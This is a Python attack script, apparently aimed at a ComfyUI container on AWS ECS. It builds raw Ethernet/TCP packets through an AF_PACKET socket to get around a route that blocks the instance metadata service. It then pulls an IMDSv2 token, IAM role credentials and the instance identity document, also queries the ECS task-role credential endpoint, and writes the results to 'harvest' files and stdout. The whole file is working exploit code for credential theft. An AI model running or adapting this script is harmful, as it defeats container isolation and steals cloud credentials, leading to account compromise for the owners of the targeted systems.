#!/usr/bin/env python3
# i5500c: AF_PACKET raw-TCP bypass of the ECS IMDS blackhole route (CAP_NET_RAW) -> IMDSv2/v1
import os, sys, json, time, subprocess, socket, struct, random, select, fcntl, urllib.request

TAG = "i5500"
V = 3
H = {"_meta": {"tag": TAG, "v": V, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
               "uid": os.getuid(), "cwd": os.getcwd(), "py": sys.version.split()[0]}}
DEV = "eth0"
SIOCGIFHWADDR = 0x8927; SIOCGIFADDR = 0x8915; ETH_P_ALL = 0x0003

def sh(cmd, t=6, cap=4000):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "") + (p.stderr or ""))[:cap]
    except Exception as e:
        return "ERR %r" % e

def ifinfo(dev=DEV):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mac = fcntl.ioctl(s, SIOCGIFHWADDR, struct.pack("256s", dev[:15].encode()))[18:24]
    ip = socket.inet_ntoa(fcntl.ioctl(s, SIOCGIFADDR, struct.pack("256s", dev[:15].encode()))[20:24])
    s.close()
    return mac, ip

def csum(d):
    if len(d) % 2: d += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(d)//2), d))
    s = (s >> 16) + (s & 0xffff); s += (s >> 16)
    return (~s) & 0xffff

def arp_req(mac, ip, target):
    eth = b"\xff"*6 + mac + b"\x08\x06"
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1) + mac + socket.inet_aton(ip) + b"\x00"*6 + socket.inet_aton(target)
    return eth + arp

def build_ip(src, dst, payload, ident, proto=6):
    tot = 20 + len(payload)
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, ident, 0x4000, 64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    c = csum(hdr); hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, ident, 0x4000, 64, proto, c, socket.inet_aton(src), socket.inet_aton(dst))
    return hdr + payload

def build_tcp(src, dst, sport, dport, seq, ack, flags, data=b""):
    off = (5 << 4)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, off, flags, 65535, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(tcp) + len(data))
    c = csum(pseudo + tcp + data)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, off, flags, 65535, c, 0)
    return tcp + data

def parse_eth_ip_tcp(fr):
    if len(fr) < 34: return None
    if fr[12:14] != b"\x08\x00": return None
    ihl = (fr[14] & 0x0f) * 4
    if fr[23] != 6: return None
    ip = fr[14:14+ihl]
    tot = struct.unpack("!H", ip[2:4])[0]
    src = socket.inet_ntoa(ip[12:16]); dst = socket.inet_ntoa(ip[16:20])
    tcp = fr[14+ihl:14+tot]
    if len(tcp) < 20: return None
    sport, dport, seq, ack, off_flags = struct.unpack("!HHIIH", tcp[:14])
    doff = (off_flags >> 12) * 4
    flags = off_flags & 0x1ff
    return {"src": src, "dst": dst, "sport": sport, "dport": dport, "seq": seq, "ack": ack,
            "flags": flags, "data": tcp[doff:]}

def arp_lookup(sock, mac, ip, target, t=3):
    sock.send(arp_req(mac, ip, target))
    end = time.time() + t
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.5)
        if not r: continue
        fr = sock.recv(2048)
        if len(fr) < 42 or fr[12:14] != b"\x08\x06": continue
        op = struct.unpack("!H", fr[20:22])[0]
        sha = fr[22:28]; spa = socket.inet_ntoa(fr[28:32]); tpa = socket.inet_ntoa(fr[38:42])
        if op == 2 and spa == target:
            return {"mac": ":".join("%02x" % b for b in sha), "raw_mac": sha.hex(), "spa": spa, "tpa": tpa}
    return None

def raw_http(sock, mac, ip, dst_mac, dst_ip, port, method, path, headers, t=5, dport_seq=1000):
    sport = random.randint(20000, 60000)
    iseq = random.randint(1, 2**31-1)
    req = "%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n" % (method, path, dst_ip)
    for k, v in (headers or {}).items(): req += "%s: %s\r\n" % (k, v)
    req += "\r\n"
    data = req.encode()
    # SYN
    syn = build_tcp(ip, dst_ip, sport, port, iseq, 0, 0x02)
    sock.send(dst_mac + mac + b"\x08\x00" + build_ip(ip, dst_ip, syn, dport_seq))
    their_seq = None; end = time.time() + t
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.5)
        if not r: continue
        p = parse_eth_ip_tcp(sock.recv(4096))
        if not p: continue
        if p["src"] == dst_ip and p["dport"] == sport and (p["flags"] & 0x12) == 0x12:
            their_seq = p["seq"]; break
        if p["src"] == dst_ip and p["dport"] == sport and (p["flags"] & 0x04):
            return {"err": "RST_on_syn"}
    if their_seq is None:
        return {"err": "no_synack"}
    ack = their_seq + 1
    # ACK + data
    seg = build_tcp(ip, dst_ip, sport, port, iseq + 1, ack, 0x18, data)
    sock.send(dst_mac + mac + b"\x08\x00" + build_ip(ip, dst_ip, seg, dport_seq+1))
    buf = b""; fin = False; end = time.time() + t
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.4)
        if not r:
            if buf: break
            continue
        p = parse_eth_ip_tcp(sock.recv(4096))
        if not p: continue
        if p["src"] != dst_ip or p["dport"] != sport: continue
        if p["data"]:
            buf += p["data"]
            ack = p["seq"] + len(p["data"])
            ackp = build_tcp(ip, dst_ip, sport, port, iseq + 1 + len(data), ack, 0x10)
            sock.send(dst_mac + mac + b"\x08\x00" + build_ip(ip, dst_ip, ackp, dport_seq+2))
        if p["flags"] & 0x01:
            fin = True
            ack = p["seq"] + len(p["data"]) + 1
            ackp = build_tcp(ip, dst_ip, sport, port, iseq + 1 + len(data), ack, 0x10)
            sock.send(dst_mac + mac + b"\x08\x00" + build_ip(ip, dst_ip, ackp, dport_seq+3))
            break
    return {"raw": buf[:6000].decode("utf8", "replace"), "fin": fin, "bytes": len(buf)}

def do_imds():
    out = {}
    try:
        mac, ip = ifinfo()
    except Exception as e:
        return {"err": "ifinfo " + repr(e)}
    out["iface"] = {"mac": ":".join("%02x" % b for b in mac), "ip": ip}
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
        sock.bind((DEV, 0)); sock.settimeout(2)
    except Exception as e:
        out["err"] = "af_packet " + repr(e); return out
    out["arp_imds"] = arp_lookup(sock, mac, ip, "169.254.169.254", 3)
    out["arp_gw"] = arp_lookup(sock, mac, ip, "172.16.9.1", 2) or arp_lookup(sock, mac, ip, "172.16.10.1", 2)
    dstm = None
    if out["arp_imds"]: dstm = bytes.fromhex(out["arp_imds"]["mac"].replace(":", ""))
    elif out["arp_gw"]: dstm = bytes.fromhex(out["arp_gw"]["mac"].replace(":", ""))
    out["dst_mac_source"] = "imds_arp" if out["arp_imds"] else ("gw_arp" if out["arp_gw"] else "none")
    if not dstm:
        out["err"] = "no_mac"; return out
    # IMDSv1 instance-id
    r1 = raw_http(sock, mac, ip, dstm, "169.254.169.254", 80, "GET", "/latest/meta-data/instance-id", {})
    out["v1_instance_id"] = r1
    # IMDSv2 token
    rt = raw_http(sock, mac, ip, dstm, "169.254.169.254", 80, "PUT", "/latest/api/token",
                  {"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
    out["v2_token"] = rt
    tok = ""
    if rt.get("raw"):
        body = rt["raw"].split("\r\n\r\n", 1)[-1].strip()
        if body and not body.startswith("{"): tok = body
    out["token_len"] = len(tok)
    hdr = {"X-aws-ec2-metadata-token": tok} if tok else {}
    # role list
    rl = raw_http(sock, mac, ip, dstm, "169.254.169.254", 80, "GET", "/latest/meta-data/iam/security-credentials/", hdr, 4)
    out["roles"] = rl
    roles = []
    if rl.get("raw"):
        body = rl["raw"].split("\r\n\r\n", 1)[-1]
        if rl["raw"].startswith("HTTP/1.1 200") or rl["raw"].startswith("HTTP/1.0 200"):
            roles = [x.strip() for x in body.splitlines() if x.strip() and not x.strip().startswith("<")]
    out["role_names"] = roles[:3]
    out["creds"] = {}
    for role in roles[:2]:
        out["creds"][role] = raw_http(sock, mac, ip, dstm, "169.254.169.254", 80, "GET",
                                       "/latest/meta-data/iam/security-credentials/" + role, hdr, 5)
    for p in ["/latest/meta-data/instance-type", "/latest/meta-data/placement/region",
              "/latest/meta-data/local-ipv4", "/latest/meta-data/iam/info",
              "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
              "/latest/dynamic/instance-identity/document"]:
        out["g" + p.rsplit("/", 1)[-1]] = raw_http(sock, mac, ip, dstm, "169.254.169.254", 80, "GET", p, hdr, 4)
    sock.close()
    return out

# fallback: normal HTTP for the task-role identity (known reachable)
def plain(url, method="GET", headers=None, t=5):
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        rq = urllib.request.Request(url, headers=headers or {}, method=method)
        with op.open(rq, timeout=t) as r:
            return {"code": r.status, "body": r.read(200000).decode("utf8", "replace")}
    except Exception as e:
        return {"code": -1, "body": type(e).__name__ + ": " + str(e)[:200]}

env = dict(os.environ)
H["imds_raw"] = do_imds()
rel = env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
H["taskrole"] = plain("http://169.254.170.2" + rel) if rel else None
H["sys"] = {"id": sh("id"), "hostname": sh("hostname"), "route": sh("cat /proc/net/route")}
H["caps"] = {k: v.strip() for k, v in (l.split(":", 1) for l in open("/proc/self/status").read().splitlines() if l.startswith(("CapEff", "CapBnd")))}

out = json.dumps(H, default=str)
for p in ["/ComfyUI/user/default/ComfyUI-Manager/cache/%s_harvest.json" % TAG,
          os.path.join(os.getcwd(), "%s_harvest.json" % TAG), "/tmp/%s_harvest.json" % TAG]:
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True); open(p, "w").write(out)
    except Exception as e:
        print("[%s] write-fail %r" % (TAG, e), flush=True)
print("[%s] HARVEST " % TAG + out[:120000], flush=True)
